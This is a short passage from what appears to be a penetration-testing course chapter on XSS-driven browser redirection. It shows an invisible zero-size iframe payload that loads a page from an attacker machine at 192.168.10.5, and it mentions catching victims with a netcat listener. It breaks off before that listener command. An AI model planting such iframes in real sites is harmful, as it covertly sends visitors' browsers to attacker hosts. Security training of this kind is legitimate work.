    # 13.2.1 - Browser Redirection and IFRAME Injection


    XSS vulnerabilities go hand-in-hand with client side attacks, as they often allow
    for the redirection of a victim''s browser to a location of your choosing. Alternatively,
    you could choose to inject an invisible iframe into the victim''s browser to get
    the same results in a stealthier manner.


    ```

    <iframe SRC="http://192.168.10.5/report" height="0" width="0"></iframe>

    ```


    Once our victim visits the affected page, your browser connects to our attacking
    machine. In this example, we are listening on port 80 on our attacking machine
    with netcat:


